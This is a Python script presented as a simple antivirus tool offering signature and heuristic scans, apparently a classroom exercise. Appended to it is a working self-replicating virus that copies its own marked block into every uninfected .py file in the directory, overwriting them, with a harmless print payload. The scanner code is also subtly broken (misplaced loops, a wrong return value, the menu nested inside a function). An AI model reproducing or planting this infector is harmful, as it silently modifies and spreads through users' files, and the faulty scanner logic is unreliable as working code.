#virus scan program
import re,glob,os,csv
#signature scan
#scan for signatures just like semantic or other virus software
def checkForSignatures():
    print("#### checking for virus signatures #####")
    #get all programs in the directory
    programs = glob.glob("*.py")
    for p in programs:
        thisFileInfected=False
        file = open(p,"r")
        lines = file.readlines()
        file.close()
    for line in lines:
        if(re.search("^#starting virus code",line)):
        # found virus
            print("\n!!!! virus found in file "+p)
            thisFileInfected = True
        if (thisFileInfected == False):
            print(p+" has no virus")
            print("#### end section ####\n")
            
#heuristic scan
def getFileData():
    # get an intial scan of file size and data modified. save
    programs = glob.glob("*.py")
    programList=[]
    for p in programs:
        programSize= os.path.getsize(p)
        programModified= os.path.getmtime(p)
        programData=[p,programSize,programModified]
        programList.append(programData)
        return property
    
def WriteFileData(programs):
    if os.path.exists("fileData.txt"):
        return
    with open("fileData.txt","w") as file:
        wr=csv.writer(file)
        wr.writerows(programs)
        
def checkForChanges():
    print("\n\n###### check for heuristic changes in files ######")
    # open the fileData.txt file and compare each line
    # to the current file size and dates
    with open("fileData.txt") as file:
        fileList=file.read().splitlines()
        orginalFileList=[]
        for each in fileList:
            items = each.split(',')
            orginalFileList.append(items)
    # get current data from directory
    currentFileList=getFileData()
    #compare old and new
    for c in currentFileList:
        for o in orginalFileList:
            if(c[0]==o[0]): #filename matched
                if str(c[1])!=str(o[1]) or str(c[2])!=str(o[2]):
                    #filesize or date don't match
                    print("\nalert!!! File mismatch")
                    #print data of each file
                    print("current values= "+str(c))
                    print("orginal values= "+str(o))
                else:
                    print("file "+c[0]+" appears to be unchanged")
                    
        print("##### finished checking for changes #######")
        #do an initial scan and save the results in a text file
    print("##################################################")
    print("##################################################")
    print("## WELCOME TO RAPID HEAL TOTAL SECURITY ##")
    print("## ##")
    print("## CHOOSE FROM THE BELOW SCAN METHODS: ##")
    print("## 1. SIGNATURE SCAN ##")
    print("## 2. HEURISTIC SCAN ##")
    print("## ##")
    print("## ENTER YOUR CHOICE BELOW: ##")
    choice1 = int(input("## ==> "))
    print("## ##")
    print("##################################################")
    print("##################################################")
    if choice1 == 1:
        checkForSignatures()
    elif choice1 == 2:
        WriteFileData(getFileData())
        checkForChanges()
    else:
        print("Invalid choice entered, Please choose from the available choices.")
#starting virus code

import sys,re,glob

#put a copy of all these lines into a list

virusCode =[]

#open this file and read all lines
#filter out all lines that are not inside the virus code boundary
thisFile=sys.argv[0]
virusFile=open(thisFile,"r")
lines=virusFile.readlines()
virusFile.close()
#save the lines into a list to use later
inVirus= False

for line in lines:
    
    if(re.search("^#starting virus code",line)):
        inVirus=True
    
    #if the virus code has been found, start appending the
    #lines to the virusCode list. We assume that the virus
    #code is always appended to the end of the script.
    
    if(inVirus==True):
        virusCode.append(line)
    if(re.search("^#end of virus code",line)):
        break
    
#find potential victims
programs = glob.glob("*.py")
#check and infact all programs that glob found
for p in programs:
    file = open(p,"r")
    programCode= file.readlines()
    file.close()
    #check if the file is already infacted
    infected= False
    for line in programCode:
        if(re.search("^#starting virus code", line)):
            infected= True
            break
    #no need to infect it again.
    if not infected:
        newCode= []
        #newVersion = current version + virus code
        newCode = programCode
        newCode.extend(virusCode)
        #new version of file. overwrite the original
        file = open(p,"w")
        file.writelines(newCode)
        file.close()
        
#payload-print file is infected
print("This file is infected")
#end of virus code
